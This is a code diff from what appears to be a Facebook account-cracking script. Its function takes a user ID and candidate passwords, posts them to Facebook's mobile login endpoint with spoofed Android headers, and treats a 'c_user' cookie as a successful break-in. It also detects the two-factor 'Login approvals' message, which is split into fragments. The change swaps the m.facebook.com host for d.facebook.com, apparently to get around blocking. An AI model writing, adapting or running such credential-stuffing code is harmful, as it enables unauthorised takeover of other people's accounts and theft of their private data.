@@ -1452,7 +1452,7 @@ def x(uid,pwx,tl):
             'pass': pw,
             'login': 'Log in'}
             headers = {
-            'Host': 'm.facebook.com',
+            'Host': 'd.facebook.com',
             'Connection': 'keep-alive',
             'sec-ch-ua-platform': '"Android"',
             'User-Agent': 'Mozilla/5.0 (Linux; Android 13; Android_Device) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.6723.17 Mobile Safari/537.36',
@@ -1463,11 +1463,11 @@ def x(uid,pwx,tl):
             'Sec-Fetch-Site': 'same-site',
             'Sec-Fetch-Mode': 'no-cors',
             'Sec-Fetch-Dest': 'image',
-            'Referer': 'https://m.facebook.com/',
+            'Referer': 'https://d.facebook.com/',
             'Accept-Encoding': 'gzip, deflate, br, zstd',
             'Accept-Language': 'en,en-US;q=0.9'}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://m.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028"
+            url = "https://d.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
